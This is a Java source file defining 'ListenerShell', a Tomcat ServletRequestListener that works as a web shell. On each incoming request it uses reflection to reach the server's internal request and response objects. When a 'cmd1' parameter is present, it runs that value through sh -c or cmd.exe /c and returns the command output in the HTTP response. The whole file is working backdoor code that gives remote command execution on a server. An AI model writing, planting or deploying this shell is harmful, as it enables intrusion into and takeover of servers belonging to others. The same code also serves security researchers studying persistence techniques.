package cn.safe6.listener;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.Scanner;

public class ListenerShell implements ServletRequestListener {
    public void requestDestroyed(ServletRequestEvent sre) {

    }

    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        try {
            //从上下文拿request和response
            RequestFacade req = (RequestFacade) servletRequestEvent.getServletRequest();
            Field requestField= req.getClass().getDeclaredField("request");
            requestField.setAccessible(true);
            Request request = (Request) requestField.get(req);
            Response resp = request.getResponse();

            if (req.getParameter("cmd1") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd1")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd1")};
                InputStream in = null;
                in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                System.out.println(output);
                resp.getWriter().write(output);
                resp.getWriter().flush();

            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
